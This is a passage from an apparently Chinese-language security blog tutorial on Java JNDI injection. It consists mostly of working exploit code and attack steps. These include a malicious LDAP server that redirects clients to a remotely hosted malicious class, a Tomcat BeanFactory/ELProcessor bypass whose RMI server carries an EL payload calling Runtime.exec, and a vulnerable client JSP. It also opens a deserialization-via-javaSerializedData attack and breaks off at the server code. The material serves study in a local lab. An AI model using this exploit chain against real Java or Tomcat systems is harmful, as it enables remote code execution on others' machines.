</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">InMemoryDirectoryServer</span> <span style="color:#58a1dd">ds</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InMemoryDirectoryServer</span>(<span style="color:#58a1dd">config</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Listening on 0.0.0.0:&#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">port</span>); <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">ds</span>.<span style="color:#58a1dd">startListening</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">catch</span> ( <span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">OperationInterceptor</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">InMemoryOperationInterceptor</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">codebase</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#58a1dd">OperationInterceptor</span> ( <span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">cb</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">codebase</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">cb</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">@Override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">processSearchResult</span> ( <span style="color:#58a1dd">InMemoryInterceptedSearchResult</span> <span style="color:#58a1dd">result</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">base</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">result</span>.<span style="color:#58a1dd">getRequest</span>().<span style="color:#58a1dd">getBaseDN</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Entry</span> <span style="color:#58a1dd">e</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Entry</span>(<span style="color:#58a1dd">base</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">sendResult</span>(<span style="color:#58a1dd">result</span>, <span style="color:#58a1dd">base</span>, <span style="color:#58a1dd">e</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">catch</span> ( <span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e1</span> ) {
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">e1</span>.<span style="color:#58a1dd">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">protected</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">sendResult</span> ( <span style="color:#58a1dd">InMemoryInterceptedSearchResult</span> <span style="color:#58a1dd">result</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">base</span>, <span style="color:#58a1dd">Entry</span> <span style="color:#58a1dd">e</span> ) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">LDAPException</span>, <span style="color:#58a1dd">MalformedURLException</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">turl</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">URL</span>(<span style="color:#ff636f">this</span>.<span style="color:#58a1dd">codebase</span>, <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">codebase</span>.<span style="color:#58a1dd">getRef</span>().<span style="color:#58a1dd">replace</span>(<span style="color:#a6be9d">&#39;.&#39;</span>, <span style="color:#a6be9d">&#39;/&#39;</span>).<span style="color:#58a1dd">concat</span>(<span style="color:#a6be9d">&#34;.class&#34;</span>));
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Send LDAP reference result for &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">base</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34; redirecting to &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">turl</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">addAttribute</span>(<span style="color:#a6be9d">&#34;javaClassName&#34;</span>, <span style="color:#a6be9d">&#34;ExportObject&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">cbstring</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">codebase</span>.<span style="color:#58a1dd">toString</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">int</span> <span style="color:#58a1dd">refPos</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">cbstring</span>.<span style="color:#58a1dd">indexOf</span>(<span style="color:#a6be9d">&#39;#&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> ( <span style="color:#58a1dd">refPos</span> <span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">0</span> ) {
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">cbstring</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">cbstring</span>.<span style="color:#58a1dd">substring</span>(<span style="color:#58a1dd">0</span>, <span style="color:#58a1dd">refPos</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">addAttribute</span>(<span style="color:#a6be9d">&#34;javaCodeBase&#34;</span>, <span style="color:#58a1dd">cbstring</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">addAttribute</span>(<span style="color:#a6be9d">&#34;objectClass&#34;</span>, <span style="color:#a6be9d">&#34;javaNamingReference&#34;</span>); <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">addAttribute</span>(<span style="color:#a6be9d">&#34;javaFactory&#34;</span>, <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">codebase</span>.<span style="color:#58a1dd">getRef</span>());
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">result</span>.<span style="color:#58a1dd">sendSearchEntry</span>(<span style="color:#58a1dd">e</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">result</span>.<span style="color:#58a1dd">setResult</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">LDAPResult</span>(<span style="color:#58a1dd">0</span>, <span style="color:#58a1dd">ResultCode</span>.<span style="color:#58a1dd">SUCCESS</span>));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>恶意类同上面的EvilClass.java</p>
<p><strong>完整攻击流程</strong>:</p>
<ol>
<li>编译EvilClass.java为EvilClass.class (<code>javac EvilClass.java</code>)</li>
<li>运行恶意http server，挂载上述class(<code>python3 -m http.server 8000</code>)</li>
<li>运行恶意rmi server(上面的LDAPServer类)</li>
<li>运行客户端发起请求(上面的LDAPClient类)</li>
<li>客户端对恶意LDAP server发送请求，获取远程对象存根实例</li>
<li>客户端会先从本地的<code>CLASSPATH</code>中寻找<code>ExportObject</code>，如果找不到，则从javaFactory即<code>http://127.0.0.1:8000/EvilClass.class</code>中寻找工厂类</li>
<li>客户端通过实例化工厂类获取真正的对象，工厂类中包含的恶意代码被执行</li>
</ol>
<h3 id="本地-factory" class="heading-element"><span>本地 Factory</span>
  <a href="#%e6%9c%ac%e5%9c%b0-factory" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><blockquote>
<p>在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。</p>
</blockquote>
<h4 id="限制条件-2" class="heading-element"><span>限制条件</span>
  <a href="#%e9%99%90%e5%88%b6%e6%9d%a1%e4%bb%b6-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ol>
<li>客户端存在一个实现了<code>javax.naming.spi.ObjectFactory</code>接口且存在<code>getObjectInstance()</code>方法的类，如<code>org.apache.naming.factory.BeanFactory</code></li>
<li><code>getObjectInstance()</code>方法存在可以利用的逻辑(如<code>BeanFactory</code>可以实例化对象的beanClass)
<ol>
<li>在<code>BeanFactory</code>这个例子中，<code>getObjectInstance()</code>方法会实例化对象的beanClass。</li>
</ol>
</li>
</ol>
<p>其中，beanClass需要满足以下几个条件(通过分析<code>BeanFactory.getObjectInstance()</code>得出:</p>
<ol>
<li>本地classpath里存在</li>
<li>具有无参构造方法</li>
<li>有直接或间接执行代码的方法，并且方法只能传入一个字符串参数。</li>
</ol>
<p>通过上述的描述，寻找到符合的类有:</p>
<ol>
<li>tomcat8里的j<code>avax.el.ELProcessor#eval(String)</code></li>
<li>springboot 1.2.x自带的<code>groovy.lang.GroovyShell#evaluate(String)</code></li>
</ol>
<h4 id="攻击流程-2" class="heading-element"><span>攻击流程</span>
  <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ol>
<li><code>Obj.decodeObject()</code>返回Reference对象</li>
<li>接着会进入<code>NamingManager.getObjectFactoryFromReference()</code>，如果是Reference对象，则会返回一个ObjectFactory对象（这里实现类是BeanFactory）</li>
<li>实例化beanClass后，会获取Reference对象里的forceString属性值</li>
<li>将属性值会以逗号和等号分割，格式如param1=methodName1,param2=methodName2</li>
<li>接着会反射调用beanClass对象里名为methodName1的方法，并传入参数，限定参数类型为String，参数通过Reference对象里param1属性获取。</li>
</ol>
<p>模拟攻击流程如下:</p>
<p>搭建tomcat源码的测试环境(中文乱码问题参考<a href="https://cloud.tencent.com/developer/article/1441354"target="_blank" rel="external nofollow noopener noreferrer">这里</a>)，这里注意要修改下pom.xml的依赖(网上搜索到的pom.xml会缺乏LDAPServer的依赖且easyMock的版本过低)，这是我使用的依赖</p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;project xmlns=&#34;http://maven.apache.org/POM/4.0.0&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
         xsi:schemaLocation=&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;&gt;

  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
  &lt;groupId&gt;org.apache&lt;/groupId&gt;
  &lt;artifactId&gt;tomcat&lt;/artifactId&gt;
  &lt;name&gt;apache-tomcat-8.5.75&lt;/name&gt;
  &lt;version&gt;8.5.75&lt;/version&gt;

  &lt;build&gt;
    &lt;finalName&gt;Tomcat-8.5.57&lt;/finalName&gt;
    &lt;sourceDirectory&gt;java&lt;/sourceDirectory&gt;
    &lt;testSourceDirectory&gt;test&lt;/testSourceDirectory&gt;
    &lt;resources&gt;
      &lt;resource&gt;
        &lt;directory&gt;java&lt;/directory&gt;
      &lt;/resource&gt;
    &lt;/resources&gt;
    &lt;testResources&gt;
      &lt;testResource&gt;
        &lt;directory&gt;test&lt;/directory&gt;
      &lt;/testResource&gt;
    &lt;/testResources&gt;
    &lt;plugins&gt;
      &lt;plugin&gt;
        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
        &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
        &lt;version&gt;3.5.1&lt;/version&gt;
        &lt;configuration&gt;
          &lt;encoding&gt;UTF-8&lt;/encoding&gt;
          &lt;source&gt;1.8&lt;/source&gt;
          &lt;target&gt;1.8&lt;/target&gt;
        &lt;/configuration&gt;
      &lt;/plugin&gt;
    &lt;/plugins&gt;
  &lt;/build&gt;

  &lt;dependencies&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;junit&lt;/groupId&gt;
      &lt;artifactId&gt;junit&lt;/artifactId&gt;
      &lt;version&gt;4.12&lt;/version&gt;
      &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
      &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
      &lt;version&gt;6.0.0&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.easymock&lt;/groupId&gt;
      &lt;artifactId&gt;easymock&lt;/artifactId&gt;
      &lt;version&gt;4.3&lt;/version&gt;
      &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;

    &lt;dependency&gt;
      &lt;groupId&gt;org.apache.ant&lt;/groupId&gt;
      &lt;artifactId&gt;ant&lt;/artifactId&gt;
      &lt;version&gt;1.10.0&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;wsdl4j&lt;/groupId&gt;
      &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;
      &lt;version&gt;1.6.2&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;javax.xml&lt;/groupId&gt;
      &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;
      &lt;version&gt;1.1&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;
      &lt;artifactId&gt;ecj&lt;/artifactId&gt;
      &lt;version&gt;4.6.1&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!-- https://mvnrepository.com/artifact/org.glassfish/javax.xml.rpc --&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.glassfish&lt;/groupId&gt;
      &lt;artifactId&gt;javax.xml.rpc&lt;/artifactId&gt;
      &lt;version&gt;3.0.1-b03&lt;/version&gt;
    &lt;/dependency&gt;

  &lt;/dependencies&gt;
&lt;/project&gt;</code></pre><p>在创建java/exp文件夹并写入RMILocalFactoryServer.java:</p>
<pre tabindex="0"><code>package exp;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMILocalFactoryServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        // 创建Registry
        Registry registry = LocateRegistry.createRegistry(9999);
        ResourceRef ref = new ResourceRef(&#34;javax.el.ELProcessor&#34;, null, &#34;&#34;, &#34;&#34;, true,&#34;org.apache.naming.factory.BeanFactory&#34;,null);
        ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;KINGX=eval&#34;));
        ref.add(new StringRefAddr(&#34;KINGX&#34;, &#34;&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(null).exec(&#39;calc.exe&#39;)&#34;));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind(&#34;Exploit&#34;, referenceWrapper);

        System.out.println(&#34;java LocalFactory RMI registry created. port on 9999...&#34;);
    }
}</code></pre><p>在web/ROOT中写入client.jsp:</p>
<pre tabindex="0"><code>&lt;%@ page import=&#34;javax.naming.*&#34; %&gt;
&lt;%@ page import=&#34;javax.el.ELProcessor&#34; %&gt;

&lt;%
    try {
        Context ctx = new InitialContext();
        ctx.lookup(&#34;rmi://127.0.0.1:9999/Exploit&#34;);
    } catch (NamingException e) {
        e.printStackTrace();
    }
%&gt;</code></pre><p>运行RMILocalFactoryServer</p>
<p>运行tomcat服务器，访问http://127.0.0.1:8080/client.jsp，触发任意java代码执行</p>
<h3 id="serializeddata--ldap攻击" class="heading-element"><span>SerializedData + LDAP攻击</span>
  <a href="#serializeddata--ldap%e6%94%bb%e5%87%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这种攻击方法不受jdk版本的限制，但是要求目标存在可利用的java组件</p>
<h4 id="限制条件-3" class="heading-element"><span>限制条件</span>
  <a href="#%e9%99%90%e5%88%b6%e6%9d%a1%e4%bb%b6-3" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>客户端存在可利用的java组件</p>
<h4 id="前置介绍" class="heading-element"><span>前置介绍</span>
  <a href="#%e5%89%8d%e7%bd%ae%e4%bb%8b%e7%bb%8d" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。分析如下:</p>
<p>当客户端从服务器中获取到对象，进行解析时，<code>com.sun.jndi.ldap.Obj.decodeObject()</code>:</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716020.webp" alt="image-20240902171626816" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716020.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716020.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716020.webp?size=large 2x" data-title="image-20240902171626816" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>此时如果javaSerializedData不为空则进入第一个分支，先根据codebase判断使用哪个ClassLoader，这对于本地反序列化来说没有影响，接着跟进<code>deserializeObject()</code>:</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716295.webp" alt="image-20240902171652145" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716295.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716295.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021716295.webp?size=large 2x" data-title="image-20240902171652145" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里直接将我们传入的javaSerializedData反序列化。</p>
<h4 id="攻击流程-3" class="heading-element"><span>攻击流程</span>
  <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b-3" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><strong>完整代码如下</strong>:</p>
<p>客户端:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.Context</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.InitialContext</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">LDAPClient</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Context</span> <span style="color:#58a1dd">ctx</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InitialContext</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ctx</span>.<span style="color:#58a1dd">lookup</span>(<span style="color:#a6be9d">&#34;ldap://127.0.0.1:7777/anything&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>客户端与服务端maven依赖:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">dependency</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">groupId</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">commons</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">collections</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">groupId</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">artifactId</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">commons</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">collections</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">artifactId</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">version</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">3</span>.<span style="color:#58a1dd">1</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">version</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">dependency</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><p>服务端:</p>
